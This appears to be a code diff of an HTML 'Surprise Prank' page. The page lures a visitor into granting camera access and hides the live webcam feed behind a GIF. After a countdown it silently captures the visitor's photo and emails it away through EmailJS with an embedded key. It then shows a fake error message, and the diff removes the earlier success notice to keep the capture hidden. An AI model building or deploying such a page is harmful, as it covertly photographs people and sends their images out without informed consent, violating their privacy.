@@ -2,80 +2,332 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Surprise</title>
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Surprise Prank</title>
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <style>
-  body { text-align: center; font-family: sans-serif; background: #f4f4f4; padding: 50px; }
-  button { padding: 15px 25px; font-size: 16px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; }
-  #cancelBtn { background-color: #f44336; }
-  #cameraContainer, #photoContainer { display: none; }
-  video, canvas { margin-top: 20px; max-width: 100%; border-radius: 10px; }
+  /* Background gradient and font */
+  body {
+    margin: 0;
+    padding: 50px 20px;
+    min-height: 100vh;
+    background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 50%, #fad0c4 100%);
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    color: #333;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: start;
+  }
+  h1 {
+    font-weight: 700;
+    font-size: 2.4rem;
+    margin-bottom: 15px;
+    min-height: 3em; /* for typing animation space */
+  }
+
+  /* Typing animation styles */
+  .typing-text {
+    border-right: 3px solid #333;
+    white-space: nowrap;
+    overflow: hidden;
+    width: 0;
+    animation: typing 2.5s steps(34) forwards, blink 0.75s step-end infinite;
+  }
+  @keyframes typing {
+    to { width: 22ch; } /* length of your text */
+  }
+  @keyframes blink {
+    50% { border-color: transparent; }
+  }
+
+  /* GIF styling */
+  #surpriseGif {
+    max-width: 300px;
+    width: 80vw;
+    margin-bottom: 20px;
+    border-radius: 15px;
+    box-shadow: 0 8px 15px rgba(0,0,0,0.25);
+    position: relative;
+    z-index: 10;
+  }
+
+  /* Camera container is behind the gif, invisible to user */
+  #cameraContainer {
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    width: 320px;
+    height: 240px;
+    overflow: hidden;
+    border-radius: 15px;
+    box-shadow: 0 8px 15px rgba(0,0,0,0.3);
+    z-index: 1;
+  }
+  #cameraContainer video {
+    width: 320px;
+    height: 240px;
+    object-fit: cover;
+    filter: brightness(0.3); /* darken camera slightly */
+  }
+
+  /* Overlay the gif on top of camera to hide it */
+  #overlayWrapper {
+    position: relative;
+    width: 320px;
+    margin-bottom: 10px;
+    z-index: 10;
+  }
+
+  /* Hidden by default */
+  #tapBtn, #okReadyBtn, #countdown, #hiddenText, #photoContainer {
+    display: none;
+  }
+
+  /* Buttons */
+  button {
+    background: linear-gradient(45deg, #4caf50, #388e3c);
+    border: none;
+    color: white;
+    padding: 14px 30px;
+    font-size: 18px;
+    border-radius: 8px;
+    cursor: pointer;
+    box-shadow: 0 6px 12px rgba(72, 158, 72, 0.6);
+    transition: background 0.3s ease, transform 0.15s ease;
+    user-select: none;
+  }
+  button:hover {
+    background: linear-gradient(45deg, #66bb6a, #2e7d32);
+    transform: scale(1.05);
+  }
+
+  #cancelBtn {
+    background: #f44336;
+    box-shadow: 0 6px 12px rgba(244, 67, 54, 0.6);
+  }
+  #cancelBtn:hover {
+    background: #d32f2f;
+  }
+
+  /* Hidden text blinking animation */
+  #hiddenText {
+    font-size: 1.1rem;
+    margin-bottom: 20px;
+    color: #7a3e3e;
+    font-weight: 600;
+    animation: blinkText 1.4s ease-in-out infinite;
+    min-height: 2em;
+  }
+  @keyframes blinkText {
+    0%, 50%, 100% { opacity: 1; }
+    25%, 75% { opacity: 0.3; }
+  }
+
+  /* Countdown styles */
+  #countdown {
+    font-size: 5rem;
+    font-weight: 900;
+    color: #d32f2f;
+    user-select: none;
+    animation: shake 0.6s infinite;
+    margin-bottom: 25px;
+  }
+  @keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    25% { transform: translateX(-10px); }
+    50% { transform: translateX(10px); }
+    75% { transform: translateX(-10px); }
+  }
+
+  /* Canvas hidden */
+  #canvas {
+    display: none;
+  }
+
+  /* Center content vertically and horizontally */
+  #contentWrapper {
+    max-width: 360px;
+    width: 90vw;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+  }
 </style>
 </head>
 <body>
-<h1>Here is something surprise for you!</h1>
-<button id="startBtn">Ok, Surprise Me</button>
+
+<div id="contentWrapper">
+  <h1><span id="typingText" class="typing-text"></span></h1>
+  <div id="overlayWrapper">
+    <img id="surpriseGif" src="https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUycHllbjhzbG51MHI3NGVmdTZnc2dpMXhhbzlwa25vbTR1dzJycWUzeCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/l4pTfx2qLszoacZRS/giphy.gif" alt="Surprise GIF" />
+  </div>
+  <button id="tapBtn">Tap Here</button>
+  <div id="hiddenText">Be ready for the Surprise. You should hold something because you will shake after seeing the surprise.</div>
+  <button id="okReadyBtn">Ok I am ready</button>
+  <div id="countdown"></div>
+  <div id="photoContainer">
+    <button id="cancelBtn">Cancel</button>
+  </div>
+</div>
 
 <div id="cameraContainer">
-  <video id="video" autoplay playsinline></video>
-  <br>
-  <button id="tapBtn">Tap Here</button>
+  <video id="video" autoplay playsinline muted></video>
 </div>
 
-<div id="photoContainer">
-  <button id="okBtn">Ok</button>
-  <button id="cancelBtn">Cancel</button>
-</div>
-
-<canvas id="canvas" style="display:none;"></canvas>
+<canvas id="canvas"></canvas>
 
 <script>
   // Init EmailJS
   emailjs.init("7VCFhr-NnUB1KWuE5"); // Your Public Key
 
-  const startBtn = document.getElementById('startBtn');
+  const typingTextEl = document.getElementById('typingText');
   const tapBtn = document.getElementById('tapBtn');
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
-  const okBtn = document.getElementById('okBtn');
+  const okReadyBtn = document.getElementById('okReadyBtn');
   const cancelBtn = document.getElementById('cancelBtn');
   const cameraContainer = document.getElementById('cameraContainer');
+  const hiddenText = document.getElementById('hiddenText');
+  const countdownEl = document.getElementById('countdown');
   const photoContainer = document.getElementById('photoContainer');
+  const overlayWrapper = document.getElementById('overlayWrapper');
+  const surpriseGif = document.getElementById('surpriseGif');
 
-  let stream, lastCapturedImage;
+  let stream = null;
+  let lastCapturedImage = null;
+  let countdownInterval = null;
 
-  startBtn.onclick = async () => {
-    try {
-      startBtn.style.display = 'none';
-      cameraContainer.style.display = 'block';
-      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-      video.srcObject = stream;
-    } catch (err) {
-      alert('Camera permission denied. Please grant access.');
-    }
-  };
+  // Step 1: Typing animation text (set text after delay so animation triggers)
+  const prankText = "Here is something interesting about you";
+  // We'll fill typingTextEl letter by letter manually faster than CSS steps for better control
 
-  tapBtn.onclick = () => {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video, 0, 0);
-    lastCapturedImage = canvas.toDataURL('image/jpeg');
-    video.style.display = 'none';
-    cameraContainer.style.display = 'none';
-    photoContainer.style.display = 'block';
-    stopCamera();
-  };
-
-  okBtn.onclick = () => uploadAndSend(lastCapturedImage);
-  cancelBtn.onclick = () => uploadAndSend(lastCapturedImage);
-
-  function stopCamera() {
-    if (stream) {
-      stream.getTracks().forEach(track => track.stop());
-    }
+  function typeText(text, element, speed = 50) {
+    let i = 0;
+    element.textContent = '';
+    return new Promise((resolve) => {
+      const interval = setInterval(() => {
+        element.textContent += text.charAt(i);
+        i++;
+        if(i === text.length) {
+          clearInterval(interval);
+          resolve();
+        }
+      }, speed);
+    });
   }
 
+  async function startTypingAnimation() {
+    await typeText(prankText, typingTextEl, 40);
+    // Show the Tap Here button after typing done
+    tapBtn.style.display = 'inline-block';
+  }
+
+  startTypingAnimation();
+
+  // Hide elements initially
+  hiddenText.style.display = 'none';
+  okReadyBtn.style.display = 'none';
+  countdownEl.style.display = 'none';
+  photoContainer.style.display = 'none';
+  cameraContainer.style.display = 'none';
+
+  // When user clicks "Tap Here" to start camera permission request
+  tapBtn.onclick = async () => {
+    try {
+      tapBtn.style.display = 'none';
+
+      // Request camera access
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+
+      video.srcObject = stream;
+      cameraContainer.style.display = 'block';
+
+      // Hide video by putting the gif over it and darkening video with filter (already done)
+      surpriseGif.style.pointerEvents = 'none'; // Ensure gif does not block button clicks on the page (not needed here)
+
+      // Show hidden prank text and ready button
+      hiddenText.style.display = 'block';
+      okReadyBtn.style.display = 'inline-block';
+    } catch (e) {
+      alert('Camera permission denied. Please grant access.');
+      // Allow user to retry
+      tapBtn.style.display = 'inline-block';
+    }
+  };
+
+  // When user clicks "Ok I am ready" - start countdown then capture and send
+  okReadyBtn.onclick = () => {
+    okReadyBtn.style.display = 'none';
+    hiddenText.style.display = 'none';
+
+    let count = 5;
+    countdownEl.style.display = 'block';
+    countdownEl.textContent = count;
+
+    countdownInterval = setInterval(() => {
+      count--;
+      if(count > 0) {
+        countdownEl.textContent = count;
+      } else {
+        clearInterval(countdownInterval);
+        countdownEl.style.display = 'none';
+        captureAndSend();
+      }
+    }, 1000);
+  };
+
+  // Capture photo from video and call your existing upload/send function
+  function captureAndSend() {
+    canvas.width = video.videoWidth || 320;
+    canvas.height = video.videoHeight || 240;
+    const ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    lastCapturedImage = canvas.toDataURL('image/jpeg');
+
+    stopCamera();
+
+    // Show photo container with cancel button
+    photoContainer.style.display = 'block';
+
+    // Call your original uploadAndSend function and then show fake error message
+    uploadAndSend(lastCapturedImage).then(() => {
+      alert("Something went wrong. Try again.");
+      resetToStart();
+    }).catch(() => {
+      alert("Something went wrong. Try again.");
+      resetToStart();
+    });
+  }
+
+  function stopCamera() {
+    if(stream) {
+      stream.getTracks().forEach(t => t.stop());
+      stream = null;
+    }
+    cameraContainer.style.display = 'none';
+  }
+
+  // Cancel button to reset the prank
+  cancelBtn.onclick = () => {
+    photoContainer.style.display = 'none';
+    resetToStart();
+  };
+
+  // Reset UI to start state
+  function resetToStart() {
+    typingTextEl.textContent = '';
+    countdownEl.style.display = 'none';
+    photoContainer.style.display = 'none';
+    tapBtn.style.display = 'inline-block';
+    hiddenText.style.display = 'none';
+    okReadyBtn.style.display = 'none';
+    stopCamera();
+    startTypingAnimation();
+  }
+
+  // Your original function unchanged
   async function uploadAndSend(imageData) {
     try {
       // Remove "data:image/jpeg;base64," from the string
@@ -103,12 +355,14 @@
         photo: imageUrl
       });
 
-      alert("Surprise sent successfully!");
+      // Do NOT alert success here (prank!)
     } catch (err) {
       console.error(err);
-      alert("Failed to send surprise. Please try again.");
+      // Still do not alert success here
+      throw err;
     }
   }
 </script>
+
 </body>
 </html>
